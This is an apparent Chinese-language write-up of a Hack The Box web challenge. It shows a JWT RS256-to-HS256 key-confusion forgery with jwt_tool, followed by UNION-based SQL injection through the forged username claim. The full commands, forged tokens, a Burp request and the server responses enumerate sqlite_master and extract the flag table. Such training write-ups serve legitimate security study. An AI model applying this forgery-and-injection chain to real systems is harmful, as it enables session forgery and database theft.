@@ -1,0 +1,94 @@
+JWT问题
+
+从页面内容上看可能是SQLi，但是用'or 1=1 --绕过登录时候什么也没发生。然后尝试register，注册用户之后再登录，发现可以转到新页面，但是什么也没有。观察HTTP交互内容发现cookie里有很长串的内容。
+
+Cookie: session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.jb7h4A-c1ZE5ejRqmLSMnp0h62bej_zuXXHx1hBFjSNN72RWXAnIz5WOyoywA3nD85kJvHfdougH3_pBEenzHTCKnCeIA3C00wuXqftwOj0gC8qTo4WoQ0xq6-eIPA9s3j8qAcsslc5Cxp9swoGsCruxGn8I9t2NwWmcAohCujTkvgYImxdluqAjemdtQ4qAxFBL3M0g4v_kODYlXIK3Fq5e1LhKc7Z8r9URTW1mS49fGB6F4SBiZJbuE7yvDktSc3NXRXiCy60hT7zxDCvZOpNudcpTBTLhaEC4K1fuPk2umarsm0tsz-qRPKIfWGsRAYWcamr68zAjB-W6_f447Q
+
+去https://jwt.io/解码，发现内容数据是一个公钥。搜索之后发现是JWT key confusion exploit问题，使用公钥当作对称密钥加密内容，强迫服务器把验证方式从非对称换成对称。
+
+Header:
+{
+  "alg": "RS256",
+  "typ": "JWT"
+}
+
+payload:
+{
+  "username": "test",
+  "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
+  "iat": 1622344925
+}
+
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
+ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
+XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
+jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
++FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
+V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
+0wIDAQAB
+-----END PUBLIC KEY-----
+
+读下载的代码发现AuthMiddleware处理JWT验证，并且包括RS256和HS256两种解码方法。同时AuthMiddleware是在用户登录之前的验证，完成后用户名的数据会送到DBHelper.js中作为SQL命令参数。
+
+在网上找到一个叫jwt_tool的工具，可以使用这个工具来构造攻击内容。使用以下命令并且用burp suite替换cookie里的session发送至服务器，发现成功获得正确的返回页面。
+
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.jb7h4A-c1ZE5ejRqmLSMnp0h62bej_zuXXHx1hBFjSNN72RWXAnIz5WOyoywA3nD85kJvHfdougH3_pBEenzHTCKnCeIA3C00wuXqftwOj0gC8qTo4WoQ0xq6-eIPA9s3j8qAcsslc5Cxp9swoGsCruxGn8I9t2NwWmcAohCujTkvgYImxdluqAjemdtQ4qAxFBL3M0g4v_kODYlXIK3Fq5e1LhKc7Z8r9URTW1mS49fGB6F4SBiZJbuE7yvDktSc3NXRXiCy60hT7zxDCvZOpNudcpTBTLhaEC4K1fuPk2umarsm0tsz-qRPKIfWGsRAYWcamr68zAjB-W6_f447Q -I -pc username -pv test -X k -pk ../../hackthebox/tracks/under_construction/pub.key
+
+命令输出结果：
+File loaded: ../../hackthebox/tracks/under_construction/pub.key
+jwttool_f691d55bd0f1d490369a1d0c41a52943 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
+(This will only be valid on unpatched implementations of JWT.)                                                                                                                                      
+[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.NpEfRVlpRmh6N0Y8vdhgVYFvPyCtrFpJhdwcV0kT6Rc  
+
+Burp suite发送内容：
+GET / HTTP/1.1
+Host: 138.68.182.108:31032
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://138.68.182.108:31032/auth?error=Registered%20successfully&type=success
+Connection: close
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.NpEfRVlpRmh6N0Y8vdhgVYFvPyCtrFpJhdwcV0kT6Rc
+Upgrade-Insecure-Requests: 1
+
+执行以下命令:
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.jb7h4A-c1ZE5ejRqmLSMnp0h62bej_zuXXHx1hBFjSNN72RWXAnIz5WOyoywA3nD85kJvHfdougH3_pBEenzHTCKnCeIA3C00wuXqftwOj0gC8qTo4WoQ0xq6-eIPA9s3j8qAcsslc5Cxp9swoGsCruxGn8I9t2NwWmcAohCujTkvgYImxdluqAjemdtQ4qAxFBL3M0g4v_kODYlXIK3Fq5e1LhKc7Z8r9URTW1mS49fGB6F4SBiZJbuE7yvDktSc3NXRXiCy60hT7zxDCvZOpNudcpTBTLhaEC4K1fuPk2umarsm0tsz-qRPKIfWGsRAYWcamr68zAjB-W6_f447Q -I -pc username -pv "test\'union select 1,2,3--" -X k -pk ../../hackthebox/tracks/under_construction/pub.key
+
+发送至服务器，获得回复
+               <div class="card-body">
+                    Welcome 2<br>
+                    This site is under development. <br>
+                    Please come back later.
+                </div>
+说明SQLi成功。
+
+继续执行：
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.jb7h4A-c1ZE5ejRqmLSMnp0h62bej_zuXXHx1hBFjSNN72RWXAnIz5WOyoywA3nD85kJvHfdougH3_pBEenzHTCKnCeIA3C00wuXqftwOj0gC8qTo4WoQ0xq6-eIPA9s3j8qAcsslc5Cxp9swoGsCruxGn8I9t2NwWmcAohCujTkvgYImxdluqAjemdtQ4qAxFBL3M0g4v_kODYlXIK3Fq5e1LhKc7Z8r9URTW1mS49fGB6F4SBiZJbuE7yvDktSc3NXRXiCy60hT7zxDCvZOpNudcpTBTLhaEC4K1fuPk2umarsm0tsz-qRPKIfWGsRAYWcamr68zAjB-W6_f447Q -I -pc username -pv "test\'union select 1, name, 2 from sqlite_master where type='table' limit 1--" -X k -pk ../../hackthebox/tracks/under_construction/pub.key 
+
+获得回复：
+               <div class="card-body">
+                    Welcome flag_storage<br>
+                    This site is under development. <br>
+                    Please come back later.
+                </div>
+
+继续执行：
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.jb7h4A-c1ZE5ejRqmLSMnp0h62bej_zuXXHx1hBFjSNN72RWXAnIz5WOyoywA3nD85kJvHfdougH3_pBEenzHTCKnCeIA3C00wuXqftwOj0gC8qTo4WoQ0xq6-eIPA9s3j8qAcsslc5Cxp9swoGsCruxGn8I9t2NwWmcAohCujTkvgYImxdluqAjemdtQ4qAxFBL3M0g4v_kODYlXIK3Fq5e1LhKc7Z8r9URTW1mS49fGB6F4SBiZJbuE7yvDktSc3NXRXiCy60hT7zxDCvZOpNudcpTBTLhaEC4K1fuPk2umarsm0tsz-qRPKIfWGsRAYWcamr68zAjB-W6_f447Q -I -pc username -pv "test\'union select 1, sql, 2 from sqlite_master where tbl_name='flag_storage' and type='table' limit 1 offset 0--" -X k -pk ../../hackthebox/tracks/under_construction/pub.key
+
+获得回复：
+               <div class="card-body">
+                    Welcome CREATE TABLE &quot;flag_storage&quot; (
+	&quot;id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,
+	&quot;top_secret_flaag&quot;	TEXT
+)<br>
+                    This site is under development. <br>
+                    Please come back later.
+                </div>
+
+从返回内容看表flag_storage有两列，id和top_securet_flaag.
+继续执行：
+python3 jwt_tool.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjIzNDQ5MjV9.jb7h4A-c1ZE5ejRqmLSMnp0h62bej_zuXXHx1hBFjSNN72RWXAnIz5WOyoywA3nD85kJvHfdougH3_pBEenzHTCKnCeIA3C00wuXqftwOj0gC8qTo4WoQ0xq6-eIPA9s3j8qAcsslc5Cxp9swoGsCruxGn8I9t2NwWmcAohCujTkvgYImxdluqAjemdtQ4qAxFBL3M0g4v_kODYlXIK3Fq5e1LhKc7Z8r9URTW1mS49fGB6F4SBiZJbuE7yvDktSc3NXRXiCy60hT7zxDCvZOpNudcpTBTLhaEC4K1fuPk2umarsm0tsz-qRPKIfWGsRAYWcamr68zAjB-W6_f447Q -I -pc username -pv "test\'union select 1, top_secret_flaag, 2 from flag_storage limit 1--" -X k -pk ../../hackthebox/tracks/under_construction/pub.key
+
+可以得到flag.
